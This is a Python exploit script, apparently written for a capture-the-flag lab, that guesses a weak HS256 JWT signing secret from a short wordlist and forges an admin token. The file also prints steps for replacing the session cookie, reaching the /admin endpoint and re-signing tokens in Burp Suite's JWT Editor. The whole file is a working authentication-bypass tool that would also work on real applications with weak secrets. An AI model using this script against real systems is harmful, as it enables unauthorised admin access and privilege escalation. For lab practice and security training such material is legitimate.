import subprocess
import sys
import time
import jwt
import base64
from datetime import datetime, timedelta

def crack_jwt_secret(jwt_token, wordlist=None):
    """Simulate JWT secret cracking using common passwords"""
    if wordlist is None:
        # Common weak secrets
        wordlist = [
            "secret", "password", "123456", "admin", "test",
            "secret1", "admin123", "password123", "test123",
            "qwerty", "letmein", "welcome", "monkey", "dragon"
        ]
    
    print(f"Attempting to crack JWT: {jwt_token[:50]}...")
    
    for secret in wordlist:
        try:
            decoded = jwt.decode(jwt_token, secret, algorithms=["HS256"])
            print(f"\n✅ SECRET FOUND: {secret}")
            print(f"Decoded payload: {decoded}")
            return secret
        except jwt.InvalidSignatureError:
            print(f"❌ Failed: {secret}")
            continue
        except Exception as e:
            print(f"⚠️  Error with {secret}: {e}")
            continue
    
    print("\n❌ Secret not found in wordlist")
    return None

def create_admin_jwt(secret, username="admin"):
    """Create a forged JWT with admin privileges"""
    payload = {
        "iss": "inventorymanager",
        "exp": int((datetime.utcnow() + timedelta(hours=24)).timestamp()),
        "sub": username,
        "role": "admin",
        "kid": "forged-key"
    }
    
    forged_token = jwt.encode(payload, secret, algorithm="HS256")
    print(f"\n🔑 Forged admin JWT created:")
    print(f"Token: {forged_token}")
    
    # Create JWK format for Burp JWT Editor
    b64_secret = base64.b64encode(secret.encode()).decode()
    jwk = {
        "kty": "oct",
        "kid": "burp-key",
        "k": b64_secret
    }
    
    print(f"\n📝 JWK for Burp Suite JWT Editor:")
    print(f"Base64 Secret: {b64_secret}")
    print(f"JWK: {jwk}")
    
    return forged_token

def main():
    """Main exploitation script"""
    print("🔓 JWT Weak Secret Exploitation Tool")
    print("="*50)
    
    if len(sys.argv) < 2:
        print("Usage: python exploit.py <jwt_token>")
        print("Example: python exploit.py eyJhbGciOiJIUzI1NiJ9...")
        return
    
    jwt_token = sys.argv[1]
    
    # Step 1: Crack the secret
    print("\n📊 Step 1: Cracking JWT secret...")
    secret = crack_jwt_secret(jwt_token)
    
    if not secret:
        print("❌ Failed to crack JWT secret")
        return
    
    # Step 2: Create forged admin token
    print("\n🎯 Step 2: Creating forged admin token...")
    admin_token = create_admin_jwt(secret)
    
    # Step 3: Provide usage instructions
    print("\n📋 Step 3: Usage Instructions:")
    print("1. Copy the forged JWT token above")
    print("2. Replace your session cookie with the new token")
    print("3. Access /admin endpoint")
    print("4. Look for flags in the Critical Assets table")
    
    print("\n🎯 Burp Suite Instructions:")
    print("1. Install JWT Editor extension")
    print("2. Go to JWT Editor Keys tab")
    print("3. Click 'New Symmetric Key'")
    print("4. Replace 'k' value with Base64 secret above")
    print("5. Use this key to sign modified JWTs")

if __name__ == "__main__":
    main()
